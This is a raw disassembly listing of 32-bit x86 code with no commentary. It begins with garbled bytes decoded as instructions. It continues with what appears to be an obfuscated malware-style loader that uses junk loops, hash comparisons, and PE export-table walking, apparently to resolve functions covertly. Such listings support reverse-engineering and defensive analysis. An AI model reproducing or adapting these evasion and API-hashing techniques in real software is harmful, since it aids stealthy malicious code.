  4222e7:	or     ebp,DWORD PTR [edi]
  4222e9:	out    0xd4,eax
  4222eb:	(bad)  
  4222ec:	jmp    0x4e07:0xcdfda3a9
  4222f3:	je     0x42231e
  4222f5:	sub    al,0x2e
  4222f7:	pop    eax
  4222f8:	push   ds
  4222f9:	and    BYTE PTR [ecx+0xa61edc4],bh
  4222ff:	sbb    al,0x3e
  422301:	es pop es
  422303:	pop    ds
  422304:	pop    es
  422305:	outs   dx,BYTE PTR ds:[esi]
  422306:	and    BYTE PTR [ecx+0x1079c53e],0x98
  42230d:	xchg   esi,eax
  42230e:	arpl   WORD PTR [edx+edi*2+0x6876f6cf],sp
  422315:	xchg   ecx,eax
  422316:	sub    al,0x4c
  422318:	test   ebp,edx
  42231a:	(bad)  
  42231b:	fsubr  QWORD PTR [ebp+eax*4-0x2d6df4dd]
  422322:	in     eax,0x45
  422324:	push   0x1f
  422326:	mov    ebx,0xe3d4af99
  42232b:	mov    WORD PTR [eax-0x3],fs
  42232e:	shl    DWORD PTR [edi],cl
  422330:	inc    ecx
  422331:	jg     0x4223b0
  422333:	pop    ebx
  422334:	outs   dx,DWORD PTR ds:[esi]
  422335:	jmp    0x4222f9
  422337:	fdiv   DWORD PTR [edi-0x266c54ef]
  42233d:	ins    DWORD PTR es:[edi],dx
  42233e:	mov    cl,0xe
  422340:	into   
  422341:	push   esi
  422342:	mov    bh,0x18
  422344:	in     eax,0x17
  422346:	aaa    
  422347:	xor    ebp,ebp
  422349:	lahf   
  42234a:	jecxz  0x422353
  42234c:	clc    
  42234d:	in     eax,dx
  42234e:	mov    edi,0x95aaf98b
  422353:	mov    ds:0x5102a428,eax
  422358:	test   ebx,0x82bd4d95
  42235e:	mov    esp,0xee5e0421
  422363:	loop   0x422315
  422365:	mov    edi,0x5923c9eb
  42236a:	pop    ss
  42236b:	push   ebp
  42236c:	imul   edi,edi,0x3fc7f5c9
  422372:	sub    DWORD PTR [edi+0x112aaea5],0xe
  422379:	fcmovne st,st(0)
  42237b:	xchg   esi,eax
  42237c:	mov    eax,0x83598c66
  422381:	(bad)  
  422382:	retf   
  422383:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422384:	add    esp,ebp
  422386:	jbe    0x42234b
  422388:	pop    ds
  422389:	arpl   WORD PTR [edx],bx
  42238b:	test   BYTE PTR [ecx+0x409daeb6],dh
  422391:	fbstp  TBYTE PTR [esi-0x50dab7b8]
  422397:	imul   esp,DWORD PTR [edx+0x7842ee5],0x6a
  42239e:	push   esp
  42239f:	jo     0x422406
  4223a1:	test   al,0x75
  4223a3:	sbb    eax,0x9295eaa2
  4223a8:	lock ds call 0x746b:0xac083a66
  4223b1:	mov    WORD PTR [eax-0x2bf77038],ss
  4223b7:	cmp    DWORD PTR [ebx+0x6b],0xffffff9c
  4223bb:	jecxz  0x422388
  4223bd:	stos   DWORD PTR es:[edi],eax
  4223be:	sub    DWORD PTR ds:[ebp-0x50],0xffffffc6
  4223c3:	out    dx,al
  4223c4:	rcl    ch,0xd5
  4223c7:	sub    DWORD PTR gs:[ecx],esi
  4223ca:	mov    dh,0x99
  4223cc:	add    eax,0xd4347431
  4223d1:	stc    
  4223d2:	xchg   edi,eax
  4223d3:	lods   eax,DWORD PTR ds:[esi]
  4223d4:	inc    eax
  4223d5:	test   BYTE PTR [ecx-0x67d4a59f],al
  4223db:	js     0x4223f0
  4223dd:	push   0x9bc2db37
  4223e2:	ss push esp
  4223e4:	fsubr  QWORD PTR [bx+si]
  4223e7:	enter  0x2668,0x53
  4223eb:	xchg   esi,eax
  4223ec:	outs   dx,DWORD PTR ds:[esi]
  4223ed:	stos   DWORD PTR es:[edi],eax
  4223ee:	(bad)  
  4223ef:	dec    edi
  4223f0:	mov    edi,0x7506b6d2
  4223f5:	add    eax,0xdb21c291
  4223fa:	fincstp 
  4223fc:	add    eax,0x7d347638
  422401:	push   0xffffff95
  422403:	add    cl,BYTE PTR ds:[edx+0x67004243]
  42240a:	fst    QWORD PTR [edx-0x3a]
  42240d:	sbb    ch,al
  42240f:	xor    BYTE PTR [eax+0x38],bl
  422412:	mov    ebx,0x664b93a5
  422417:	lds    ecx,FWORD PTR [esi]
  422419:	imul   esp,DWORD PTR [eax+0xa],0x4f
  42241d:	leave  
  42241e:	iret   
  42241f:	inc    ebx
  422420:	out    dx,eax
  422421:	repz sbb BYTE PTR [ecx-0x70497a06],bl
  422428:	xlat   BYTE PTR ds:[ebx]
  422429:	and    al,al
  42242b:	test   BYTE PTR [eax+eax*4],bh
  42242e:	cld    
  42242f:	xor    eax,0xcc41bfd9
  422434:	sbb    edi,edx
  422436:	ret    0xe9e9
  422439:	add    dh,BYTE PTR [ebx]
  42243b:	outs   dx,BYTE PTR ds:[esi]
  42243c:	cmp    eax,DWORD PTR [edi+ebx*1-0x66172b41]
  422443:	(bad)  
  422444:	sub    DWORD PTR [eax+0x2a],0xffffffd4
  422448:	lea    eax,[eax]
  42244a:	pop    es
  42244b:	mov    esi,DWORD PTR [esi]
  42244d:	sbb    eax,0xb41720e5
  422452:	hlt    
  422453:	sahf   
  422454:	stos   BYTE PTR es:[edi],al
  422455:	mov    ?,esp
  422457:	xor    bh,al
  422459:	sti    
  42245a:	jmp    0x38bcd8ee
  42245f:	ja     0x422480
  422461:	cmp    BYTE PTR [esi+0x2c],ch
  422464:	sahf   
  422465:	push   ss
  422466:	outs   dx,BYTE PTR ds:[esi]
  422467:	cmc    
  422468:	pop    ecx
  422469:	push   esi
  42246a:	sub    al,0xd7
  42246c:	ror    BYTE PTR ds:0xaec01ef4,0x42
  422473:	(bad)  
  422474:	ficomp DWORD PTR [eax+0x18]
  422477:	stc    
  422478:	push   esp
  422479:	pushf  
  42247a:	inc    ecx
  42247b:	std    
  42247c:	and    eax,esi
  42247e:	push   es
  42247f:	mov    DWORD PTR [esi],0xeeb2dcdf
  422485:	or     eax,0xa6ee18c9
  42248a:	cmp    BYTE PTR [edx],cl
  42248c:	add    edi,eax
  42248e:	sahf   
  42248f:	lods   al,BYTE PTR ds:[esi]
  422490:	pop    es
  422491:	add    BYTE PTR [edx+0x2ad4fda],ah
  422497:	add    ah,bh
  422499:	out    dx,al
  42249a:	lds    edi,FWORD PTR [edi+0x75ff0c6e]
  4224a0:	fadd   st(6),st
  4224a2:	add    cl,ch
  4224a4:	mov    eax,ds:0x42a2ee
  4224a9:	push   DWORD PTR [eax]
  4224ab:	push   DWORD PTR ds:0x42a552
  4224b1:	push   DWORD PTR ds:0x42a2f6
  4224b7:	push   DWORD PTR ds:0x42a532
  4224bd:	push   DWORD PTR ds:0x42af72
  4224c3:	push   DWORD PTR [ebp-0x28]
  4224c6:	push   DWORD PTR [ebp-0x2c]
  4224c9:	mov    eax,DWORD PTR [ebp-0x14]
  4224cc:	call   eax
  4224ce:	pop    edi
  4224cf:	pop    esi
  4224d0:	leave  
  4224d1:	ret    
  4224d2:	push   ebp
  4224d3:	mov    ebp,esp
  4224d5:	sub    esp,0x34
  4224d8:	push   ebx
  4224d9:	adc    edx,DWORD PTR ds:0x42b1aa
  4224df:	push   esi
  4224e0:	movzx  ecx,BYTE PTR ds:0x42b1ea
  4224e7:	sbb    DWORD PTR ds:0x42b21a,ecx
  4224ed:	push   edi
  4224ee:	mov    DWORD PTR [ebp-0x10],0xf89f85a5
  4224f5:	and    DWORD PTR ds:0x42b1c6,0x0
  4224ff:	mov    ecx,DWORD PTR ds:0x42b1c6
  422505:	inc    ecx
  422506:	mov    DWORD PTR ds:0x42b1c6,ecx
  42250c:	cmp    DWORD PTR ds:0x42b1c6,0xd
  422513:	jg     0x422552
  422519:	jmp    0x422529
  42251e:	push   0x42b1ba
  422523:	call   DWORD PTR ds:0x42b2f6
  422529:	cmp    DWORD PTR ds:0x42b1c6,0xc
  422530:	jne    0x422545
  422536:	xor    ecx,ecx
  422538:	xor    ecx,DWORD PTR ds:0x42b1c6
  42253e:	inc    ecx
  42253f:	mov    DWORD PTR ds:0x42b1c6,ecx
  422545:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  42254c:	jb     0x4224ff
  422552:	lea    eax,[ebp+0x14]
  422555:	mov    DWORD PTR [ebp-0x4],eax
  422558:	mov    DWORD PTR [ebp-0xc],0xf89c85a5
  42255f:	lea    eax,[ebp-0xc]
  422562:	mov    DWORD PTR ds:0x42b19e,0x11
  42256c:	cmp    DWORD PTR ds:0x42b19e,0x0
  422573:	je     0x4225cf
  422579:	cmp    DWORD PTR ds:0x42b19e,0x2
  422580:	jge    0x4225cf
  422586:	jmp    0x4225a3
  42258b:	push   0x42b1fa
  422590:	push   0x42b222
  422595:	push   DWORD PTR [ebp-0x28]
  422598:	push   0x42a03d
  42259d:	call   DWORD PTR ds:0x42b2fa
  4225a3:	cmp    DWORD PTR ds:0x42b19e,0x3
  4225aa:	jne    0x4225bd
  4225b0:	mov    esi,DWORD PTR ds:0x42b19e
  4225b6:	dec    esi
  4225b7:	mov    DWORD PTR ds:0x42b19e,esi
  4225bd:	mov    esi,DWORD PTR ds:0x42b19e
  4225c3:	dec    esi
  4225c4:	mov    DWORD PTR ds:0x42b19e,esi
  4225ca:	jmp    0x42256c
  4225cf:	mov    DWORD PTR [ebp-0x14],eax
  4225d2:	and    DWORD PTR ds:0x42b1f2,0x0
  4225dc:	jmp    0x4225ee
  4225e1:	mov    esi,DWORD PTR ds:0x42b1f2
  4225e7:	inc    esi
  4225e8:	mov    DWORD PTR ds:0x42b1f2,esi
  4225ee:	cmp    DWORD PTR ds:0x42b1f2,0x1a
  4225f5:	jae    0x422622
  4225fb:	cmp    DWORD PTR ds:0x42b1f2,0x2a
  422602:	jle    0x422622
  422608:	jmp    0x42261d
  42260d:	push   0x42b1ca
  422612:	push   0x42a18d
  422617:	call   DWORD PTR ds:0x42b2fe
  42261d:	jmp    0x4225e1
  422622:	mov    eax,DWORD PTR [ebp-0xc]
  422625:	mov    DWORD PTR ds:0x42b202,0x1d
  42262f:	cmp    DWORD PTR ds:0x42b202,0x0
  422636:	je     0x422692
  42263c:	cmp    DWORD PTR ds:0x42b202,0xb
  422643:	jbe    0x422692
  422649:	jmp    0x422664
  42264e:	push   DWORD PTR [ebp-0x28]
  422651:	push   0x8416
  422656:	push   0x42a285
  42265b:	push   DWORD PTR [ebp-0xc]
  42265e:	call   DWORD PTR ds:0x42b306
  422664:	cmp    DWORD PTR ds:0x42b202,0xc
  42266b:	jne    0x42267e
  422671:	mov    esi,DWORD PTR ds:0x42b202
  422677:	dec    esi
  422678:	mov    DWORD PTR ds:0x42b202,esi
  42267e:	xor    esi,esi
  422680:	add    esi,DWORD PTR ds:0x42b202
  422686:	dec    esi
  422687:	mov    DWORD PTR ds:0x42b202,esi
  42268d:	jmp    0x42262f
  422692:	mov    edx,DWORD PTR [ebp-0x14]
  422695:	xor    esi,ecx
  422697:	mov    ecx,0x75108ae
  42269c:	sbb    esi,0x78cf
  4226a2:	xor    eax,ecx
  4226a4:	add    eax,0x3272f5
  4226a9:	mov    DWORD PTR [edx],eax
  4226ab:	xor    eax,eax
  4226ad:	or     eax,DWORD PTR ds:0x42b2b6
  4226b3:	mov    eax,DWORD PTR [eax]
  4226b5:	and    DWORD PTR ds:0x42b1c2,eax
  4226bb:	mov    eax,ds:0x42a2ea
  4226c0:	mov    edx,DWORD PTR [ebp-0x4]
  4226c3:	movzx  esi,BYTE PTR ds:0x42b1b2
  4226ca:	adc    DWORD PTR ds:0x42b206,esi
  4226d0:	mov    eax,DWORD PTR [eax]
  4226d2:	add    eax,DWORD PTR [edx]
  4226d4:	and    DWORD PTR ds:0x42b1ee,ecx
  4226da:	mov    DWORD PTR [ebp-0x8],eax
  4226dd:	mov    esi,DWORD PTR [ebp+0x8]
  4226e0:	and    DWORD PTR ds:0x42b1b2,0x0
  4226ea:	jmp    0x4226fa
  4226ef:	mov    eax,ds:0x42b1b2
  4226f4:	inc    eax
  4226f5:	mov    ds:0x42b1b2,eax
  4226fa:	cmp    DWORD PTR ds:0x42b1b2,0x15
  422701:	jae    0x422746
  422707:	cmp    DWORD PTR ds:0x42b1b2,0x9
  42270e:	jbe    0x422746
  422714:	jmp    0x422729
  422719:	push   0x42a26b
  42271e:	push   0x0
  422720:	push   DWORD PTR [ebp-0x28]
  422723:	call   DWORD PTR ds:0x42b30e
  422729:	cmp    DWORD PTR ds:0x42b1b2,0x8
  422730:	jne    0x422741
  422736:	mov    eax,ds:0x42b1b2
  42273b:	inc    eax
  42273c:	mov    ds:0x42b1b2,eax
  422741:	jmp    0x4226ef
  422746:	mov    eax,ds:0x42a472
  42274b:	mov    DWORD PTR ds:0x42b21e,0x16
  422755:	cmp    DWORD PTR ds:0x42b21e,0x0
  42275c:	je     0x42278f
  422762:	cmp    DWORD PTR ds:0x42b21e,0x19
  422769:	jbe    0x42278f
  42276f:	jmp    0x42277d
  422774:	push   DWORD PTR [ebp-0x20]
  422777:	call   DWORD PTR ds:0x42b316
  42277d:	mov    edx,DWORD PTR ds:0x42b21e
  422783:	dec    edx
  422784:	mov    DWORD PTR ds:0x42b21e,edx
  42278a:	jmp    0x422755
  42278f:	mov    eax,DWORD PTR [eax+0x198]
  422795:	movzx  edx,WORD PTR ds:0x42b18e
  42279c:	xor    edx,DWORD PTR ds:0x42b1d6
  4227a2:	mov    DWORD PTR ds:0x42b18e,edx
  4227a8:	xor    esi,ecx
  4227aa:	and    DWORD PTR ds:0x42b1c2,0x42b1b2
  4227b4:	mov    edx,0x3272f5
  4227b9:	add    DWORD PTR ds:0x42b1ce,0x42b1c2
  4227c3:	add    esi,edx
  4227c5:	mov    DWORD PTR ds:0x42b1be,0x75ce
  4227cf:	cmp    DWORD PTR [eax],esi
  4227d1:	je     0x4227e8
  4227d7:	mov    eax,DWORD PTR [eax]
  4227d9:	mov    DWORD PTR ds:0x42b18e,0x18de
  4227e3:	jmp    0x422b4e
  4227e8:	mov    eax,DWORD PTR [ebp+0x18]
  4227eb:	mov    esi,DWORD PTR ds:0x42b1ee
  4227f1:	adc    DWORD PTR ds:0x42b212,esi
  4227f7:	mov    esi,DWORD PTR [ebp+0x1c]
  4227fa:	or     ebx,0xffffffff
  4227fd:	mov    DWORD PTR ds:0x42b21a,0x5f57
  422807:	cmp    eax,0x70941f95
  42280c:	mov    DWORD PTR ds:0x42b19e,0x397d
  422816:	jne    0x422857
  42281c:	mov    DWORD PTR ds:0x42b196,0x41c1
  422826:	cmp    esi,ebx
  422828:	mov    DWORD PTR ds:0x42b18e,0x6f0
  422832:	jne    0x422857
  422838:	mov    DWORD PTR ds:0x42b1e6,0x1213
  422842:	push   ebx
  422843:	push   0x70941f94
  422848:	mov    DWORD PTR ds:0x42b1ea,0x77db
  422852:	jmp    0x422b3d
  422857:	mov    eax,DWORD PTR [ebp+0x18]
  42285a:	mov    esi,DWORD PTR [ebp+0x1c]
  42285d:	mov    DWORD PTR ds:0x42b1f6,0x6621
  422867:	cmp    eax,0x70941f94
  42286c:	jne    0x422899
  422872:	mov    DWORD PTR ds:0x42b1d2,0x1239
  42287c:	cmp    esi,ebx
  42287e:	mov    DWORD PTR ds:0x42b1ea,0x2737
  422888:	jne    0x422899
  42288e:	push   ebx
  42288f:	push   0x70941f97
  422894:	jmp    0x422b3d
  422899:	mov    eax,DWORD PTR [ebp+0x18]
  42289c:	mov    esi,DWORD PTR [ebp+0x1c]
  42289f:	cmp    eax,0x70941f97
  4228a4:	jne    0x4228c7
  4228aa:	mov    DWORD PTR ds:0x42b1ba,0x121e
  4228b4:	cmp    esi,ebx
  4228b6:	jne    0x4228c7
  4228bc:	push   ebx
  4228bd:	push   0x70941f96
  4228c2:	jmp    0x422b3d
  4228c7:	mov    eax,DWORD PTR [ebp+0x18]
  4228ca:	mov    DWORD PTR ds:0x42b202,0x572d
  4228d4:	mov    esi,DWORD PTR [ebp+0x1c]
  4228d7:	cmp    eax,0x70941f96
  4228dc:	mov    DWORD PTR ds:0x42b1aa,0x369b
  4228e6:	jne    0x42291d
  4228ec:	cmp    esi,ebx
  4228ee:	jne    0x42291d
  4228f4:	mov    DWORD PTR ds:0x42b18a,0xe5c
  4228fe:	push   ebx
  4228ff:	mov    DWORD PTR ds:0x42b22e,0x5e71
  422909:	push   0x70941f99
  42290e:	mov    DWORD PTR ds:0x42b1d6,0x2b39
  422918:	jmp    0x422b3d
  42291d:	mov    DWORD PTR ds:0x42b1da,edi
  422923:	mov    esi,DWORD PTR [ebp+0x18]
  422926:	mov    eax,0x5593
  42292b:	mov    edi,DWORD PTR [ebp+0x1c]
  42292e:	mov    eax,0x70941f98
  422933:	mov    DWORD PTR ds:0x42b1a2,0x1ef3
  42293d:	cmp    esi,eax
  42293f:	mov    DWORD PTR ds:0x42b1be,0x2a6e
  422949:	jne    0x422b21
  42294f:	cmp    edi,ebx
  422951:	mov    DWORD PTR ds:0x42b19e,0x8e7
  42295b:	jne    0x422b21
  422961:	sbb    DWORD PTR ds:0x42b1ea,0x3412
  42296b:	mov    eax,DWORD PTR [ebp+0x10]
  42296e:	or     edi,edi
  422970:	xor    eax,ecx
  422972:	sbb    DWORD PTR ds:0x42b1c2,edx
  422978:	add    eax,edx
  42297a:	mov    DWORD PTR [ebp-0x20],eax
  42297d:	mov    eax,DWORD PTR [ebp+0xc]
  422980:	mov    esi,DWORD PTR [ebp-0x8]
  422983:	xor    eax,ecx
  422985:	add    eax,edx
  422987:	imul   eax,DWORD PTR [esi]
  42298a:	mov    esi,DWORD PTR [ebp+0x8]
  42298d:	xor    esi,ecx
  42298f:	add    esi,edx
  422991:	cmp    esi,eax
  422993:	mov    eax,DWORD PTR [ebp-0x4]
  422996:	mov    edi,0xffcd8d0b
  42299b:	je     0x4229ba
  4229a1:	mov    esi,DWORD PTR [ebp-0x20]
  4229a4:	add    DWORD PTR [eax],esi
  4229a6:	mov    eax,DWORD PTR [ebp-0x4]
  4229a9:	mov    esi,DWORD PTR [ebp+0xc]
  4229ac:	xor    esi,ecx
  4229ae:	add    esi,edx
  4229b0:	imul   esi,DWORD PTR [eax]
  4229b3:	mov    DWORD PTR [eax],esi
  4229b5:	jmp    0x4229bf
  4229ba:	mov    esi,DWORD PTR [ebp+0x14]
  4229bd:	xor    DWORD PTR [eax],esi
  4229bf:	mov    eax,DWORD PTR [ebp-0x4]
  4229c2:	mov    esi,DWORD PTR [ebp+0x10]
  4229c5:	xor    esi,ecx
  4229c7:	sub    edi,esi
  4229c9:	add    DWORD PTR [eax],edi
  4229cb:	mov    eax,DWORD PTR [ebp-0x4]
  4229ce:	mov    esi,DWORD PTR [ebp-0x8]
  4229d1:	add    esi,DWORD PTR [eax]
  4229d3:	mov    DWORD PTR [ebp-0x8],esi
  4229d6:	mov    eax,DWORD PTR [ebp+0xc]
  4229d9:	mov    esi,DWORD PTR [ebp+0xc]
  4229dc:	xor    esi,ecx
  4229de:	xor    eax,ecx
  4229e0:	lea    eax,[eax+esi*1+0x64e5ea]
  4229e7:	mov    esi,DWORD PTR [ebp+0xc]
  4229ea:	xor    esi,ecx
  4229ec:	add    esi,edx
  4229ee:	imul   eax,esi
  4229f1:	mov    esi,DWORD PTR [ebp+0xc]
  4229f4:	xor    esi,ecx
  4229f6:	sub    esi,eax
  4229f8:	mov    eax,DWORD PTR [ebp-0x4]
  4229fb:	add    esi,edx
  4229fd:	cmp    DWORD PTR [eax],esi
  4229ff:	mov    eax,DWORD PTR [ebp-0x4]
  422a02:	mov    esi,DWORD PTR [ebp+0x10]
  422a05:	jg     0x422a1b
  422a0b:	xor    esi,ecx
  422a0d:	mov    edi,0xffcd8d0b
  422a12:	sub    edi,esi
  422a14:	add    DWORD PTR [eax],edi
  422a16:	jmp    0x422a21
  422a1b:	xor    esi,ecx
  422a1d:	add    esi,edx
  422a1f:	add    DWORD PTR [eax],esi
  422a21:	mov    eax,DWORD PTR [ebp-0x8]
  422a24:	mov    esi,DWORD PTR [ebp-0x10]
  422a27:	mov    eax,DWORD PTR [eax]
  422a29:	xor    esi,ecx
  422a2b:	add    esi,0x3272f4
  422a31:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a38:	mov    DWORD PTR [ebp-0x24],ebx
  422a3b:	not    esi
  422a3d:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a44:	mov    DWORD PTR [ebp-0x2c],ebx
  422a47:	mov    ebx,DWORD PTR [ebp-0x28]
  422a4a:	mov    edi,DWORD PTR [ebp-0x24]
  422a4d:	and    eax,esi
  422a4f:	mov    esi,0xa141
  422a54:	xor    bx,si
  422a57:	mov    esi,0x412c
  422a5c:	add    bx,si
  422a5f:	cmp    WORD PTR [eax],bx
  422a62:	je     0x422aac
  422a68:	mov    edi,DWORD PTR [ebp-0x10]
  422a6b:	xor    edi,ecx
  422a6d:	mov    DWORD PTR [ebp-0x28],0x7097b860
  422a74:	mov    DWORD PTR [ebp-0x24],0xffffffff
  422a7b:	mov    ebx,0xffcd8d0b
  422a80:	sub    ebx,edi
  422a82:	mov    DWORD PTR [ebp-0x30],0x7097a55e
  422a89:	add    eax,ebx
  422a8b:	mov    DWORD PTR [ebp-0x2c],0xffffffff
  422a92:	mov    edi,DWORD PTR [ebp-0x28]
  422a95:	mov    ebx,DWORD PTR [ebp-0x24]
  422a98:	mov    ebx,0xa141
  422a9d:	xor    di,bx
  422aa0:	add    di,si
  422aa3:	cmp    WORD PTR [eax],di
  422aa6:	jne    0x422a68
  422aac:	mov    edi,DWORD PTR [ebp-0x14]
  422aaf:	mov    edi,DWORD PTR [edi]
  422ab1:	mov    ebx,DWORD PTR [eax+0x3c]
  422ab4:	lea    edi,[ebx+edi*8+0x78]
  422ab8:	mov    edi,DWORD PTR [edi+eax*1]
  422abb:	mov    DWORD PTR [ebp-0x18],edi
  422abe:	mov    edi,DWORD PTR [ebp+0x8]
  422ac1:	xor    edi,ecx
  422ac3:	add    edi,edx
  422ac5:	mov    DWORD PTR [ebp-0x1c],edi
  422ac8:	mov    edi,DWORD PTR [ebp+0x8]
  422acb:	xor    edi,ecx
  422acd:	mov    ecx,DWORD PTR [ebp-0x18]
  422ad0:	add    edi,edx
  422ad2:	cmp    ecx,edi
  422ad4:	je     0x422b16
  422ada:	mov    ecx,DWORD PTR [ebp-0x18]
  422add:	add    ecx,eax
  422adf:	mov    DWORD PTR [ebp-0x1c],ecx
  422ae2:	mov    ecx,DWORD PTR [ebp-0x30]
  422ae5:	mov    edx,DWORD PTR [ebp-0x2c]
  422ae8:	mov    edx,0xa141
  422aed:	xor    cx,dx
  422af0:	mov    edx,DWORD PTR [ebp-0x1c]
  422af3:	mov    edx,DWORD PTR [edx+0xc]
  422af6:	add    cx,si
  422af9:	cmp    WORD PTR [eax+edx*1],cx
  422afd:	jne    0x422b16
  422b03:	mov    ecx,DWORD PTR ds:0x42a472
  422b09:	mov    ecx,DWORD PTR [ecx+0x198]
  422b0f:	mov    DWORD PTR [ecx],eax
  422b11:	jmp    0x422b4e
  422b16:	push   DWORD PTR [ebp+0x1c]
  422b19:	push   DWORD PTR [ebp+0x18]
  422b1c:	jmp    0x422b3d
  422b21:	mov    ecx,DWORD PTR [ebp+0x18]
  422b24:	mov    edx,DWORD PTR [ebp+0x1c]
  422b27:	cmp    ecx,0x70941f99
  422b2d:	jne    0x422b4e
  422b33:	cmp    edx,ebx
  422b35:	jne    0x422b4e
  422b3b:	push   ebx
  422b3c:	push   eax
  422b3d:	push   DWORD PTR [ebp+0x14]
  422b40:	push   DWORD PTR [ebp+0x10]
  422b43:	push   DWORD PTR [ebp+0xc]
  422b46:	push   DWORD PTR [ebp+0x8]
  422b49:	call   0x4224d2
  422b4e:	pop    edi
  422b4f:	pop    esi
  422b50:	pop    ebx
  422b51:	leave  
  422b52:	ret    0x18
  422b55:	push   ebp
  422b56:	mov    ebp,esp
  422b58:	and    esp,0xfffffff8
  422b5b:	sub    esp,0x3fc
  422b61:	or     DWORD PTR ds:0x42b1a6,0x42b1c2
  422b6b:	push   ebx
  422b6c:	xor    DWORD PTR ds:0x42b216,0x42b1b6
  422b76:	push   esi
  422b77:	push   edi
  422b78:	or     DWORD PTR ds:0x42b19e,0x42b192
  422b82:	lea    eax,[esp+0x1b8]
  422b89:	push   eax
  422b8a:	sub    DWORD PTR ds:0x42b222,0x377b
  422b94:	push   0x42a596
  422b99:	call   DWORD PTR ds:0x42b312
  422b9f:	mov    DWORD PTR ds:0x42b1ee,0x356c
  422ba9:	cmp    eax,0xffffffff
  422bac:	mov    DWORD PTR ds:0x42b1d6,0x3f42
  422bb6:	je     0x422bf9
  422bbc:	sub    DWORD PTR ds:0x42b206,0x3b29
  422bc6:	push   0x42a5ca
  422bcb:	adc    DWORD PTR ds:0x42b1a6,0xd7b
  422bd5:	push   0x89677644
  422bda:	adc    DWORD PTR ds:0x42b226,0x42b22a
  422be4:	call   DWORD PTR ds:0x42b2e2
  422bea:	mov    DWORD PTR ds:0x42b1da,0xf4c
  422bf4:	jmp    0x423de7
  422bf9:	and    DWORD PTR ds:0x42b202,0xcb9
  422c03:	mov    esi,DWORD PTR ds:0x42b302
  422c09:	add    DWORD PTR ds:0x42b21e,0x42b22a
  422c13:	push   0xf
  422c15:	lea    eax,[esp+0x44]
  422c19:	push   eax
  422c1a:	push   0x42a5de
  422c1f:	push   0x42a5f2
  422c24:	mov    DWORD PTR ds:0x42b19a,0x6718
  422c2e:	push   0x42a616
  422c33:	add    DWORD PTR ds:0x42b1fe,0x42b1be
  422c3d:	call   esi
  422c3f:	imul   eax,eax,0x300000
  422c45:	cmp    eax,0x1b00000
  422c4a:	mov    DWORD PTR ds:0x42b1a6,0x2dc4
  422c54:	je     0x422c6b
  422c5a:	xor    eax,eax
  422c5c:	mov    DWORD PTR ds:0x42b18e,0x4419
  422c66:	jmp    0x423de7
  422c6b:	add    DWORD PTR ds:0x42b19e,0x42b1e6
  422c75:	lea    eax,[esp+0x78]
  422c79:	or     DWORD PTR ds:0x42b1b2,0x1042
  422c83:	push   eax
  422c84:	add    DWORD PTR ds:0x42b1a6,0x42b1e2
  422c8e:	push   0xffffffff
  422c90:	xor    DWORD PTR ds:0x42b1be,0x42b22a
  422c9a:	call   DWORD PTR ds:0x42b30a
  422ca0:	test   eax,eax
  422ca2:	mov    DWORD PTR ds:0x42b192,0x385a
  422cac:	jne    0x422c5a
  422cb2:	and    DWORD PTR ds:0x42b1de,0x0
  422cbc:	jmp    0x422cce
  422cc1:	mov    edi,DWORD PTR ds:0x42b1de
  422cc7:	inc    edi
  422cc8:	mov    DWORD PTR ds:0x42b1de,edi
  422cce:	cmp    DWORD PTR ds:0x42b1de,0x1d
  422cd5:	jae    0x422d1a
  422cdb:	cmp    DWORD PTR ds:0x42b1de,0xe
  422ce2:	jg     0x422d1a
  422ce8:	jmp    0x422cf9
  422ced:	push   DWORD PTR [ebp-0x10]
  422cf0:	push   DWORD PTR [ebp-0x14]
  422cf3:	call   DWORD PTR ds:0x42b31a
  422cf9:	cmp    DWORD PTR ds:0x42b1de,0xd
  422d00:	jne    0x422d15
  422d06:	xor    edi,edi
  422d08:	or     edi,DWORD PTR ds:0x42b1de
  422d0e:	inc    edi
  422d0f:	mov    DWORD PTR ds:0x42b1de,edi
  422d15:	jmp    0x422cc1
  422d1a:	mov    DWORD PTR [esp+0x30],eax
  422d1e:	mov    ecx,0xf89c85a5
  422d23:	and    DWORD PTR ds:0x42b20e,0x0
  422d2d:	mov    edx,DWORD PTR ds:0x42b20e
  422d33:	inc    edx
  422d34:	mov    DWORD PTR ds:0x42b20e,edx
  422d3a:	cmp    DWORD PTR ds:0x42b20e,0x21
  422d41:	jl     0x422d73
  422d47:	jmp    0x422d66
  422d4c:	push   0x42b1a2
  422d51:	push   0x1a2f
  422d56:	push   0x42a26b
  422d5b:	push   0x42a000
  422d60:	call   DWORD PTR ds:0x42b31e
  422d66:	cmp    DWORD PTR ds:0x42b20e,0x13
  422d6d:	jb     0x422d2d
  422d73:	mov    DWORD PTR [esp+0x18],ecx
  422d77:	mov    ebx,DWORD PTR ds:0x42b28e
  422d7d:	mov    edx,DWORD PTR ds:0x42b2be
  422d83:	sub    edx,ebx
  422d85:	add    ebx,DWORD PTR [ebx+edx*1]
  422d88:	mov    DWORD PTR [esp+0xc],0xf89c85a2
  422d90:	mov    ebx,DWORD PTR ds:0x42b26a
  422d96:	xor    edx,edx
  422d98:	or     edx,DWORD PTR ds:0x42b2aa
  422d9e:	sub    ebx,edx
  422da0:	and    ebx,DWORD PTR [ebx+edx*1]
  422da3:	lea    eax,[esp+0x3c]
  422da7:	or     edi,0x6d65
  422dad:	mov    DWORD PTR [esp+0x30],eax
  422db1:	adc    DWORD PTR ds:0x42b212,0x17e9
  422dbb:	lea    eax,[esp+0x38]
  422dbf:	and    DWORD PTR ds:0x42b20a,0x0
  422dc9:	mov    edx,DWORD PTR ds:0x42b20a
  422dcf:	inc    edx
  422dd0:	mov    DWORD PTR ds:0x42b20a,edx
  422dd6:	cmp    DWORD PTR ds:0x42b20a,0xc
  422ddd:	jle    0x422e18
  422de3:	jmp    0x422df1
  422de8:	push   DWORD PTR [ebp-0x14]
  422deb:	call   DWORD PTR ds:0x42b322
  422df1:	cmp    DWORD PTR ds:0x42b20a,0xb
  422df8:	jne    0x422e0b
  422dfe:	mov    edx,DWORD PTR ds:0x42b20a
  422e04:	inc    edx
  422e05:	mov    DWORD PTR ds:0x42b20a,edx
  422e0b:	cmp    DWORD PTR ds:0x42b20a,0x12
  422e12:	jb     0x422dc9
  422e18:	mov    DWORD PTR [esp+0x20],eax
  422e1c:	xor    edx,edx
  422e1e:	add    edx,DWORD PTR ds:0x42b292
  422e24:	mov    eax,ds:0x42b29a
  422e29:	sub    eax,edx
  422e2b:	add    edx,DWORD PTR [edx+eax*1]
  422e2e:	mov    eax,ds:0x42a472
